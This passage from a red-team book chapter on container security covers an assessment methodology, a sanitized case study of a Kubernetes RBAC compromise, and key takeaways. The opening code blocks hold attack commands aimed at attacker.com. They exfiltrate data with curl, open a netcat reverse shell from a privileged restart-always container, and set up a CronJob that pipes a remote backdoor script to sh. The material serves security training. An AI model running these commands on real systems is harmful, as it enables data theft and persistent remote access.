docker run -v /host/sensitive/data:/data -v $(pwd):/exfil alpine sh -c "cp /data/* /exfil/"

# Network-based exfiltration
docker run -it --network=host alpine sh -c "tar -cz /data | curl -X POST -H 'Content-Type: application/octet-stream' --data-binary @- https://attacker.com/exfil"
```

### Persistence in Container Environments

```bash
# Create a privileged container that starts on boot
docker run -d --restart=always --privileged --name persistence -v /:/host alpine sh -c 'while true; do sleep 60 && nc attacker.com 4444 -e /bin/sh; done'

# Kubernetes CronJob for persistence
kubectl create -f - << EOF
apiVersion: batch/v1beta1
kind: CronJob
metadata:
  name: persistence
spec:
  schedule: "*/5 * * * *"
  jobTemplate:
    spec:
      template:
        spec:
          containers:
          - name: backdoor
            image: alpine
            command: ["/bin/sh", "-c", "wget -q -O - http://attacker.com/backdoor.sh | sh"]
          restartPolicy: OnFailure
EOF
```

## Comprehensive Container Security Assessment Methodology

For structured container security assessments, follow this methodology:

### 1. Reconnaissance and Enumeration

```bash
# Identify container environments
docker version
kubectl version
env | grep KUBERNETES

# Enumerate container images
docker images
crictl images

# Map container networks
docker network ls
ip a | grep -i docker
```

### 2. Vulnerability Assessment

```bash
# Scan container images
trivy image [image-name]

# Check for known vulnerabilities
grype [image-name]

# Perform CIS benchmarks
docker-bench-security
kube-bench
```

### 3. Configuration Analysis

```bash
# Check Docker security configurations
docker info | grep Security

# Check Kubernetes configurations
kubectl get pods -A -o json | jq '.items[] | select(.spec.securityContext.privileged==true)'

# Analyze network policies
kubectl get networkpolicies -A
```

### 4. Exploitation

```bash
# Attempt container escapes
# - Privileged container method
# - Docker socket method
# - Kernel exploitation
# - Mounted volume method
# - Capability abuse

# Lateral movement
# - Container-to-container
# - Container-to-host
# - Kubernetes service account abuse
```

### 5. Post-Exploitation

```bash
# Maintain persistence
# - Backdoored containers
# - Kubernetes CronJobs
# - Webhook abuse

# Data exfiltration
# - Volume mounts
# - Network-based exfiltration
# - API extraction
```

### 6. Reporting and Documentation

```bash
# Document discovered vulnerabilities
# - CVSS scoring
# - Attack chains
# - Impact assessment
# - Mitigation recommendations
```

> **CASE STUDY: Kubernetes Cluster Compromise via RBAC Misconfiguration**
> 
> During a red team assessment in 2022, we identified a Kubernetes cluster supporting a major e-commerce application. Initial access was gained through a vulnerable web application running in a pod. After enumerating the service account permissions, we discovered the pod's service account had permissions to list and create new pods in the namespace.
> 
> We used this permission to create a privileged pod with hostPath volume access, which allowed us to mount the host filesystem. From there, we accessed the kubelet credentials and escalated to cluster-admin privileges. This level of access allowed us to access all data in the cluster, including customer information stored in secrets.
> 
> The root cause was improper RBAC configuration - the application service account had been granted excessive permissions because developers found it "easier" than implementing fine-grained access controls. This highlights how a seemingly minor misconfiguration can lead to complete cluster compromise.
> 
> *Source: Sanitized red team engagement report, 2022*

## Container Attack Workflow

![Container Attack Chain](./images/container_attack_chain.png)
*Figure 26.2: Container Attack Chain showing progression from initial access to host compromise*

## Conclusion

Container security assessment is a complex discipline that combines traditional Linux security techniques with container-specific attack vectors. The layered nature of container security—from images to runtimes to orchestration platforms—requires a comprehensive approach to thoroughly evaluate an organization's security posture.

Key takeaways from this chapter include:

1. **Container Isolation is Not Absolute** - Containers share the host kernel and often have configuration weaknesses that can be exploited.
2. **Privilege Misconfigurations are Common** - Privileged containers, unnecessary capabilities, and insecure volume mounts frequently provide escape paths.
3. **Supply Chain Security is Critical** - Many container compromises occur before deployment through vulnerable images or CI/CD pipelines.
4. **Orchestration Platforms Add Complexity** - Kubernetes and similar platforms introduce new attack surfaces through their APIs and control planes.
5. **Defense in Depth is Essential** - Effective container security requires multiple layers of protection, from secure images to runtime enforcement to network segmentation.

By systematically evaluating each layer of the container security stack using the techniques described in this chapter, red teamers can provide organizations with valuable insights into their containerized environments' security posture and help secure these increasingly critical infrastructure components.

## Additional Resources

1. [Kubernetes Penetration Testing](https://kubernetes.io/docs/concepts/security/security-checklist/)
2. [Docker Security Documentation](https://docs.docker.com/engine/security/)
3. [CIS Docker Benchmark](https://www.cisecurity.org/benchmark/docker)
4. [CIS Kubernetes Benchmark](https://www.cisecurity.org/benchmark/kubernetes)
5. [OWASP Container Security Verification Standard](https://github.com/OWASP/Container-Security-Verification-Standard)
6. [Container Security Book by Liz Rice](https://www.oreilly.com/library/view/container-security/9781492056690/)
7. [Docker Exploitation Techniques](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-breakout)
8. [Kubernetes Hardening Guide](https://media.defense.gov/2022/Aug/29/2003066362/-1/-1/0/CTR_KUBERNETES_HARDENING_GUIDANCE_1.2_20220829.PDF)
